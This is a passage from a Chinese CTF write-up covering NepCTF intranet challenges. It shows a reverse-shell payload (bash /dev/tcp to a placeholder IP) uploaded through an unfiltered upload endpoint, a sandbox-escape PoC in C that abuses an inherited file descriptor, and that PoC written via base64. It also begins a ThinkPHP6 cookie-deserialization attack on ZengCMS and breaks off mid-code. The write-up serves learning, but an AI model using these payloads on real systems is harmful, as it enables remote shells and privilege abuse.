class="hljs-number">1</span>)[<span class="hljs-number">1</span>].lower() == <span class="hljs-string">&#x27;png&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">82</span>,debug=<span class="hljs-literal">False</span>,use_reloader=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure>
+
+<p>这个上传文件的地方没有对文件的内容做出任何过滤</p>
+<p>于是我们可以在上传的图片中反弹shell：</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lua">import <span class="hljs-built_in">os</span><br><span class="hljs-built_in">os</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/7788 0&gt;&amp;1&#x27;&quot;</span>).<span class="hljs-built_in">read</span>()<br></code></pre></td></tr></table></figure>
+
+<p>上传：（注意图片会检查xff）</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151615420.png" srcset="/img/loading.gif" lazyload alt="image-20230815161522348"></p>
+<p>然后可以使用<code>python3</code>命令执行：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151616443.png" srcset="/img/loading.gif" lazyload alt="image-20230815161657383"></p>
+<p>成功反弹shell：</p>
+<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151616098.png" srcset="/img/loading.gif" lazyload alt="image-20230815161641870" style="zoom: 67%;" />
+
+<p>然后查看一下可疑进程：<code>ps -ef</code></p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151717948.png" srcset="/img/loading.gif" lazyload alt="image-20230815171721889"></p>
+<p>查看一下这个文件：<code>identity.c</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;openssl/md5.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/resource.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;net/if.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-comment">//gcc -o test1 test1.c -lcrypto -lm -lrt</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">init_dir</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> fd=open(<span class="hljs-string">&quot;/home/ctf/sandbox/&quot;</span>,O_RDONLY);<br>    <span class="hljs-keyword">if</span>(fd&lt;<span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    MD5_CTX ctx;<br>    <span class="hljs-type">char</span> md5_res[<span class="hljs-number">17</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-type">char</span> key[<span class="hljs-number">100</span>]=<span class="hljs-string">&quot;NEPCTF_6666&quot;</span>;<br>    <span class="hljs-type">char</span> sandbox_dir[<span class="hljs-number">100</span>]=<span class="hljs-string">&quot;/home/ctf/sandbox/&quot;</span>;<br>    <span class="hljs-type">char</span> dir_name[<span class="hljs-number">100</span>]=<span class="hljs-string">&quot;/home/ctf/sandbox/&quot;</span>;<br>    FILE *new_pip;<br>    <span class="hljs-type">int</span> i;<br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rlimit</span> <span class="hljs-title">r</span>;</span><br>    r.rlim_max = r.rlim_cur = <span class="hljs-number">0</span>;<br>    setrlimit(RLIMIT_CORE, &amp;r);<br>    <span class="hljs-built_in">memset</span>(key, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(key));<br>    MD5_Init(&amp;ctx);<br>    MD5_Update(&amp;ctx, key, <span class="hljs-built_in">strlen</span>(key));<br>    MD5_Final(md5_res, &amp;ctx);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) <br>            <span class="hljs-built_in">sprintf</span>(&amp;(dir_name[i*<span class="hljs-number">2</span> + <span class="hljs-number">18</span>]), <span class="hljs-string">&quot;%02hhx&quot;</span>, md5_res[i]&amp;<span class="hljs-number">0xff</span>);<br>    <span class="hljs-type">char</span> cmd[<span class="hljs-number">100</span>];<br>    <br>    mkdir(dir_name, <span class="hljs-number">0755</span>);<br>    <span class="hljs-keyword">if</span> (chdir(dir_name)==<span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;chdir err, exiting\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-built_in">sprintf</span>(cmd,<span class="hljs-string">&quot;%s%s&quot;</span>,<span class="hljs-string">&quot;chmod 777 &quot;</span>,dir_name);<br>    system(cmd);<br>    mkdir(<span class="hljs-string">&quot;bin&quot;</span>, <span class="hljs-number">0777</span>);<br>    mkdir(<span class="hljs-string">&quot;lib&quot;</span>, <span class="hljs-number">0777</span>);<br>    mkdir(<span class="hljs-string">&quot;lib64&quot;</span>, <span class="hljs-number">0777</span>);<br>    mkdir(<span class="hljs-string">&quot;lib/x86_64-linux-gnu&quot;</span>, <span class="hljs-number">0777</span>);<br>    system(<span class="hljs-string">&quot;cp /bin/bash bin/sh&quot;</span>);<br>    system(<span class="hljs-string">&quot;cp /lib/x86_64-linux-gnu/libdl.so.2 lib/x86_64-linux-gnu/&quot;</span>);<br>    system(<span class="hljs-string">&quot;cp /lib/x86_64-linux-gnu/libc.so.6 lib/x86_64-linux-gnu/&quot;</span>);<br>    system(<span class="hljs-string">&quot;cp /lib/x86_64-linux-gnu/libtinfo.so.5 lib/x86_64-linux-gnu/&quot;</span>);<br>    system(<span class="hljs-string">&quot;cp /lib64/ld-linux-x86-64.so.2 lib64/&quot;</span>);<br>    <span class="hljs-keyword">if</span> (chroot(<span class="hljs-string">&quot;.&quot;</span>) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;chroot err, exiting\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">command</span><span class="hljs-params">(<span class="hljs-type">int</span> server_socket,<span class="hljs-type">int</span> client_socket)</span> &#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x666</span>];<br>    <span class="hljs-built_in">memset</span>(buf,<span class="hljs-number">0</span>,<span class="hljs-number">0x666</span>);<br>    write(client_socket,<span class="hljs-string">&quot;Tmp-Command:&quot;</span>,<span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;Tmp-Command:&quot;</span>));<br>    read(client_socket, buf, <span class="hljs-number">0x10</span>);<br>    setgid(<span class="hljs-number">1001</span>);<br>    setuid(<span class="hljs-number">1001</span>);<br>    popen(buf,<span class="hljs-string">&quot;w&quot;</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">get_ip_address</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *interface_name, <span class="hljs-type">char</span> *ip_address)</span> &#123;<br>    <span class="hljs-type">int</span> sockfd;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ifreq</span> <span class="hljs-title">ifr</span>;</span><br>    <span class="hljs-comment">// Create a socket</span><br>    sockfd = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (sockfd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Socket creation failed&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-comment">// Set the interface name in the ifreq structure</span><br>    <span class="hljs-built_in">strncpy</span>(ifr.ifr_name, interface_name, IFNAMSIZ - <span class="hljs-number">1</span>);<br>    ifr.ifr_name[IFNAMSIZ - <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    <span class="hljs-comment">// Get the IP address using the SIOCGIFADDR ioctl request</span><br>    <span class="hljs-keyword">if</span> (ioctl(sockfd, SIOCGIFADDR, &amp;ifr) == <span class="hljs-number">-1</span>) &#123;<br>        perror(<span class="hljs-string">&quot;ioctl failed&quot;</span>);<br>        close(sockfd);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    close(sockfd);<br>    <span class="hljs-comment">// Convert the binary IP address to a human-readable string</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> *<span class="hljs-title">addr</span> =</span> (<span class="hljs-keyword">struct</span> sockaddr_in *)&amp;ifr.ifr_addr;<br>    <span class="hljs-built_in">strcpy</span>(ip_address, inet_ntoa(addr-&gt;sin_addr));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> &#123;<br>    init_dir();<br>    <span class="hljs-type">int</span> flag=<span class="hljs-number">1</span>;<br>    <span class="hljs-comment">// Server setup</span><br>    <span class="hljs-type">int</span> server_socket, client_socket;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">server_addr</span>, <span class="hljs-title">client_addr</span>;</span><br>    <span class="hljs-type">socklen_t</span> client_len = <span class="hljs-keyword">sizeof</span>(client_addr);<br>    <span class="hljs-comment">// Create socket</span><br>    server_socket = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (server_socket &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Socket creation failed&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-comment">// Set up server address</span><br>    <span class="hljs-built_in">memset</span>(&amp;server_addr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(server_addr));<br>    server_addr.sin_family = AF_INET;<br>    server_addr.sin_addr.s_addr = INADDR_ANY;<br>    server_addr.sin_port = htons(<span class="hljs-number">9999</span>);<br>    <span class="hljs-comment">// Bind socket to address and port</span><br>    <span class="hljs-keyword">if</span> (bind(server_socket, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;server_addr, <span class="hljs-keyword">sizeof</span>(server_addr)) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Bind failed&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-comment">// Listen for incoming connections</span><br>    <span class="hljs-keyword">if</span> (listen(server_socket, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Listen failed&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Server is listening on port 9999...\n&quot;</span>);<br>    <span class="hljs-comment">// Accept connection from client</span><br>    client_socket = accept(server_socket, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;client_addr, &amp;client_len);<br>    <span class="hljs-keyword">if</span> (client_socket &lt; <span class="hljs-number">0</span>) &#123;<br>        client_socket = accept(server_socket, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;client_addr, &amp;client_len);<br>    &#125;<br>    <span class="hljs-type">char</span> client_ip[INET_ADDRSTRLEN];<br>    inet_ntop(AF_INET, &amp;client_addr.sin_addr, client_ip, INET_ADDRSTRLEN);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Client connected from IP: %s\n&quot;</span>, client_ip);<br>    <span class="hljs-type">char</span> ip_address[INET_ADDRSTRLEN];<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *interface_name = <span class="hljs-string">&quot;eth0&quot;</span>;<br>    <span class="hljs-keyword">if</span> (get_ip_address(interface_name, ip_address) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;IP address of eth0: %s\n&quot;</span>, ip_address);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Failed to get the IP address of eth0.\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">while</span>(flag) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(client_ip,ip_address)) &#123;<br>            send(client_socket,<span class="hljs-string">&quot;Only nc by localhost!\n&quot;</span>,<span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;Only nc by localhost!\n&quot;</span>),<span class="hljs-number">0</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            flag=<span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    command(server_socket,client_socket);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里不懂，</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151718279.png" srcset="/img/loading.gif" lazyload alt="image-20230815171820218"></p>
+<blockquote>
+<p>这一部分的文件描述符并没有关闭，文件流也没关闭，因此是可以连接父进程的，<code>openat、fschmod</code>这两个内置函数</p>
+</blockquote>
+<p>然后写一个这种c脚本：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* filename = <span class="hljs-string">&quot;../../../../flag_mini&quot;</span>;<br>    <span class="hljs-type">int</span> fd = openat(<span class="hljs-number">3</span>, filename, O_CREAT | O_WRONLY);<br>    <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-comment">// 处理打开文件失败的情况</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 更改文件权限为 777</span><br>    <span class="hljs-keyword">if</span> (fchmod(fd, S_IRWXU | S_IRWXG | S_IRWXO) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-comment">// 处理更改文件权限失败的情况</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 使用新文件进行操作...</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>我们可以自行编译这个c文件，然后nc进identity以ctf用户运行，这样就可以更改flag_mini的权限为777，我们就可以读取</p>
+</blockquote>
+<p>我们可以通过base64的形式写进去：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> I2luY2x1ZGUgPGZjbnRsLmg+CiNpbmNsdWRlIDxzeXMvc3RhdC5oPgojaW5jbHVkZSA8dW5pc3RkLmg+CiNpbmNsdWRlIDxzdGRpby5oPgoKaW50IG1haW4oKSB7CiAgICBjb25zdCBjaGFyKiBmaWxlbmFtZSA9ICIuLi8uLi8uLi8uLi9mbGFnX21pbmkiOwogICAgaW50IGZkID0gb3BlbmF0KDMsIGZpbGVuYW1lLCBPX0NSRUFUIHwgT19XUk9OTFkpOwogICAgaWYgKGZkID09IC0xKSB7CiAgICAgICAgLy8g5aSE55CG5omT5byA5paH5Lu25aSx6LSl55qE5oOF5Ya1CiAgICAgICAgcHJpbnRmKCIxIik7CiAgICB9CgogICAgLy8g5pu05pS55paH5Lu25p2D6ZmQ5Li6IDc3NwogICAgaWYgKGZjaG1vZChmZCwgU19JUldYVSB8IFNfSVJXWEcgfCBTX0lSV1hPKSA9PSAtMSkgewogICAgICAgIC8vIOWkhOeQhuabtOaUueaWh+S7tuadg+mZkOWksei0peeahOaDheWGtQogICAgICAgIHByaW50ZigiMiIpOwogICAgfQoKICAgIC8vIOS9v+eUqOaWsOaWh+S7tui/m+ihjOaTjeS9nC4uLgoKICAgIHJldHVybiAwOwp9|<span class="hljs-built_in">base64</span> -d &gt;poc.c<br></code></pre></td></tr></table></figure>
+
+<p>使用<code>gcc</code>编译一下：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">gcc poc.<span class="hljs-keyword">c</span> -o poc<br></code></pre></td></tr></table></figure>
+
+<p>然后切换到：<code>/home/ctf/sandbox/d41d8cd98f00b204e9800998ecf8427e</code></p>
+<p>执行nc，我们查看一下ip：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151723636.png" srcset="/img/loading.gif" lazyload alt="image-20230815172313507"></p>
+<p>我们需要连接它的9999端口（identity文件规定了）</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151724362.png" srcset="/img/loading.gif" lazyload alt="image-20230815172412264"></p>
+<p>然后我们读flag</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151724768.png" srcset="/img/loading.gif" lazyload alt="image-20230815172432667"></p>
+<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>复现完这题学到了很多关于内网中代理等知识，学到了<code>venom</code>工具构造<code>socks5</code>代理，</p>
+<p>使用<code>proxifier</code>工具来内网穿透，这个工具可以让本机在访问指定ip时都走代理，可以实现访问内网，不需要类似于：<code>proxychains</code>的方式打开工具，有点像给系统加了一个代理</p>
+<h4 id="独步天下-破除试炼-加冕成王"><a href="#独步天下-破除试炼-加冕成王" class="headerlink" title="独步天下-破除试炼_加冕成王"></a>独步天下-破除试炼_加冕成王</h4><p>在<code>http://192.168.200.1/index.php</code>有一个web服务：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151851660.png" srcset="/img/loading.gif" lazyload alt="image-20230815185147525"></p>
+<p>是一个<code>ZengCMS</code>，这个cms存在漏洞：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151854395.png" srcset="/img/loading.gif" lazyload alt="image-20230815185436314"></p>
+<p>我们下载源码，用<code>seay</code>审计一下，搜索一下：<code>unser</code>:</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151858944.png" srcset="/img/loading.gif" lazyload alt="image-20230815185810858"></p>
+<p>查看一下这个文件：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151903575.png" srcset="/img/loading.gif" lazyload alt="image-20230815190337505"></p>
+<p>我们发现cookie会被反序列化，并且我们前面看到了这个cms是基于<code>Thinkphp6.0.x</code>的</p>
+<p>我们可以找一条基于thinkphp6的链子</p>
+<p>但是这个cookie会经过<code>think_decrypt()</code>函数解密一下</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151939750.png" srcset="/img/loading.gif" lazyload alt="image-20230815193940822"></p>
+<p>所以我们的cookie需要先通过：<code>think_encrypt()</code>加密一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">think_encrypt</span>(<span class="hljs-params"><span class="hljs-variable">$string</span>, <span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$expiry</span> = <span class="hljs-number">0</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 动态密匙长度，相同的明文会生成不同密文就是依靠动态密匙</span><br>    <span class="hljs-variable">$ckey_length</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 密匙</span><br>    <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$key</span>) ? <span class="hljs-title function_ invoke__">get_one_cache_config</span>(<span class="hljs-string">&#x27;WEB_DATA_AUTH_KEY&#x27;</span>) : <span class="hljs-variable">$key</span>));<br>    <span class="hljs-comment">// 密匙a会参与加解密</span><br>    <span class="hljs-variable">$keya</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key</span>, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>)));<br>    <span class="hljs-comment">// 密匙b会用来做数据完整性验证</span><br>    <span class="hljs-variable">$keyb</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key</span>, <span class="hljs-number">16</span>, <span class="hljs-number">16</span>)));<br>    <span class="hljs-comment">// 密匙c用于变化生成的密文</span><br>    <span class="hljs-variable">$keyc</span> = <span class="hljs-variable">$ckey_length</span> ? <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">microtime</span>()), -<span class="hljs-variable">$ckey_length</span>) : <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-comment">// 参与运算的密匙</span><br>    <span class="hljs-variable">$cryptkey</span> = <span class="hljs-variable">$keya</span> . <span class="hljs-title function_ 